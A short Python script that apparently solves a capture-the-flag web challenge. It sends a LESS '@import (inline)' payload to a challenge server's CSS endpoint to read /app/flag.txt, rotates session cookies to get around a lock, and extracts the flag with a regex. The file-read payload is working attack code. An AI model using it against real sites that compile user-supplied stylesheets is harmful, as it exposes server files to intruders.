# Exploit script for q5 of the "Stylish" challenge needs secondary verification from someone who is not me
import requests
import uuid
import re

# Target endpoint identified via Network tab/Alpine.js source
URL = "https://0059e1d2d91727c5235075ba69d4232f-stylish.web.cityinthe.cloud/update-css"

def get_flag():
    # Use uuid to rotate sessionID and bypass server-side 'lock' bug
    headers = {
        "Content-Type": "text/css",
        "Cookie": f"sessionID={uuid.uuid4()}"
    }

    # Exploits server-side LESS compiler via @import (inline) to leak local files
    payload = '.leak { content: ""; @import (inline) "/app/flag.txt"; }'

    try:
        r = requests.post(URL, data=payload, headers=headers, timeout=10)
        if r.status_code == 200:
            # Extract standard SKY-XXXX-#### flag format from CSS output
            match = re.search(r'SKY-[A-Z0-9]{4}-\d{4}', r.text)
            return match.group(0) if match else "Pattern not found"
        return f"Error: {r.status_code}"
    except Exception as e:
        return str(e)

if __name__ == "__main__":
    print(get_flag())